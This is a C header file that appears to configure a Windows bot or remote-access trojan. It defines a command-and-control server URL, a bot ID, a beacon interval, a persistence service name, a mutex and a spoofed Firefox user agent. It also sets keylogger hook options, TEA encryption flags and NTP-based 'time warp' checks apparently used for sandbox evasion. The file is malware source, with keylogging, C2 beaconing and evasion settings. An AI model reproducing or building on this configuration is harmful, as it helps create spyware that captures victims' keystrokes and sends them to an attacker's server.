#pragma once

// config
#define SERVER_URL "http://4R35.candc.efflam.net:8443"
#define BOT_ID ""
#define SLEEP_INTERVAL 10
#define SERVICE_NAME "agent_4R35"
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
#define KEYLOGGER_FILE ""
#define MUTEXID "Mutex-4R35"

#define POOL_NTP_HOST "pool.ntp.org"
#define UTC_TIME_DIFF 120

#define EXIT_CODE_TIME_WARP_NULL 0x0001
#define EXIT_CODE_TIME_WARP_2015 0x0002
#define EXIT_CODE_TIME_WARP_NTPD 0x0004

#define NO_CRYPT
#define SIMPLE_CRYPT
#define TEA_CRYPT
#define HOOK_KEYLOGGER

#ifndef HOOK_KEYLOGGER

#define KEYLOGGER_BUF_SIZE 512
#define KEYLOGGER_SLEEP_TIME 8
#define KEYLOGGER_WINDOWTXT_SIZE 60

#else

#define KEYLOGGER_BUF_SIZE 16

#endif

#define BUFFSIZE   512
#define MAXTHREADS 256

#define ReverseEndianInt(x) ((x) = \
    ((x)&0xff000000) >> 24 |\
    ((x)&0x00ff0000) >> 8 |\
    ((x)&0x0000ff00) << 8 |\
    ((x)&0x000000ff) << 24)

#define JAN_1970 2208988800UL	/* Unix base epoch */